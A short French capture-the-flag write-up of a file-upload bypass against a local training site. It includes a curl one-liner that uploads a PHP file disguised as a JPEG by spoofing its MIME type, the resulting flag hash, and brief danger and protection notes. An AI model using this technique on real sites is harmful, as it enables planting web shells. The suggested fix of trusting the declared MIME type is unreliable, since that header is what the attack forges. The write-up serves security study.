On test d'upload directement un .php a la place d'une image mains ca ne marche pas.
on sait que le protocol http permet d'identifier le contenu d'une page web via different header
on tente donc d'upload un fichier php en changeant le header http via curl

echo "<?php echo("malware"); ?>" > /tmp/malware.php && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/malware.php;type=image/jpeg" "http://localhost:8080/index.php?page=upload" | grep -n "flag"

The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

DANGER :
injecter du code php directement sur un site web (script malveillant, etc...)

PROTECTION :
verifier le MIME type des fichiers qu'on recoit.
Type de médias
Un type de médias, à l'origine appelé type MIME, est un identifiant de format de données sur internet en deux parties. 

ne jamais faire confiance aux donnees recues
